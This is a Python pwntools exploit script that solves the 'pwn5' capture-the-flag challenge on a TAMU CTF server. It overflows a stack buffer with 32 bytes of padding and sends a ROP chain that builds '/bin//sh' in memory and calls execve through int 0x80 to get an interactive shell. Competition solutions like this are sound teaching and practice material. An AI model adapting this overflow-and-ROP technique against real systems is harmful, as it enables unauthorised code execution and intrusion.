#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


context(arch="i386", os="linux", endian="little")
context.log_level = "debug"

class Pwn:
    def __init__(self):
        self.e = ELF("./pwn5")
        self.offset = 32
        self.p = None

    def start_binary(self):
#        self.p = process("./pwn5")
        self.p = remote("pwn.ctf.tamu.edu", 4325)
#        self.p.recvline()

    def pwn_binary(self):
        self.start_binary()

        self.p.sendline("toto")
        self.p.sendline("toto")
        self.p.sendline("toto")
        self.p.sendline("y")
#        self.p.recvuntil("4. Study\n")
        self.p.sendline("2")

        p = ''
        p += p32(0x0807338a)  # pop edx ; ret
        p += p32(0x080f0060)  # @ .data
        p += p32(0x080bc396)  # pop eax ; ret
        p += '/bin'
        p += p32(0x0805512b)  # mov dword ptr [edx], eax ; ret
        p += p32(0x0807338a)  # pop edx ; ret
        p += p32(0x080f0064)  # @ .data + 4
        p += p32(0x080bc396)  # pop eax ; ret
        p += '//sh'
        p += p32(0x0805512b)  # mov dword ptr [edx], eax ; ret
        p += p32(0x0807338a)  # pop edx ; ret
        p += p32(0x080f0068)  # @ .data + 8
        p += p32(0x080496b3)  # xor eax, eax ; ret
        p += p32(0x0805512b)  # mov dword ptr [edx], eax ; ret
        p += p32(0x080481d1)  # pop ebx ; ret
        p += p32(0x080f0060)  # @ .data
        p += p32(0x080e4325)  # pop ecx ; ret
        p += p32(0x080f0068)  # @ .data + 8
        p += p32(0x0807338a)  # pop edx ; ret
        p += p32(0x080f0068)  # @ .data + 8
        p += p32(0x080496b3)  # xor eax, eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x0807ebcf)  # inc eax ; ret
        p += p32(0x08071005)  # int 0x80

        self.p.send("A"*self.offset + p)

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()


